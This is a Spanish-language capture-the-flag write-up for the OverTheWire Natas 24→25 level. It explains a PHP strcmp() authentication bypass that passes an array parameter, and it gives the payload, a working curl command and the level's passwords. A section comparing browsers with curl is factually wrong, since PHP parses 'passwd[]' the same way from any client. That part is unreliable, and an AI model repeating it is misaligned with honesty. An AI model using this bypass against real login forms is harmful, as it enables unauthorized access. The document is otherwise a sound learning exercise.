# Natas 24 → 25

## Información del nivel

| Campo | Valor |
|---|---|
| URL | http://natas24.natas.labs.overthewire.org |
| Usuario | natas24 |
| Contraseña | MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd |
| Contraseña obtenida | ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws |

---

## Reconocimiento

La página presenta un formulario con un campo `passwd`. El código fuente revela que usa `strcmp()` para comparar el input con la contraseña real.

---

## Análisis del código fuente

```php
if(array_key_exists("passwd",$_REQUEST)){
    if(!strcmp($_REQUEST["passwd"],"<censored>")){
        echo "Password: <censored>";
    } else {
        echo "Wrong!";
    }
}
```

### ¿Qué hace `strcmp()`?

Compara dos strings y devuelve:
- `0` si son iguales
- número negativo si el primero es menor
- número positivo si el primero es mayor

La condición `!strcmp()` es verdadera cuando `strcmp()` devuelve `0` — es decir, cuando los strings son iguales. En condiciones normales necesitarías conocer la contraseña real.

---

## Vulnerabilidad: PHP Type Juggling con arrays

En versiones antiguas de PHP, si se pasa un **array** a `strcmp()` en lugar de un string, la función no sabe cómo compararlo y devuelve `NULL` en lugar de un número.

En PHP, `NULL` es **falsy** — igual que `0`. Por lo tanto:

```
!NULL → verdadero
!0    → verdadero
```

Ambos bypasean la condición sin conocer la contraseña real.

### ¿Por qué funciona con curl pero no con el navegador?

| Cliente | Comportamiento |
|---|---|
| Navegador | Envía `passwd[]=payload` como string literal |
| curl | Interpreta `passwd[]=payload` como sintaxis de array PHP |

El servidor recibe un array real desde curl — `strcmp()` falla y devuelve `NULL`. Desde el navegador recibe un string — `strcmp()` lo compara normalmente y devuelve Wrong.

---

## Payload

```
?passwd[]=cualquiercosa
```

El valor dentro del array no importa — lo importante es que sea un array para provocar el `NULL`.

---

## Explotación

```bash
curl -s "http://natas24.natas.labs.overthewire.org/?passwd[]=payload" \
  -u natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd | grep -i password
```

---

## Conceptos clave

- **`strcmp()`**: función PHP para comparar strings. Devuelve `0` si son iguales, `NULL` si recibe un array.
- **Type Juggling**: PHP convierte tipos automáticamente. `NULL` y `0` son ambos falsy — `!NULL` y `!0` son verdaderos.
- **Array en GET**: se envía con la sintaxis `param[]=valor` en la URL. curl lo interpreta como array PHP, el navegador lo trata como string literal.
- **Falsy en PHP**: valores que se comportan como `false` en contexto booleano: `0`, `NULL`, `""`, `false`, `[]`.
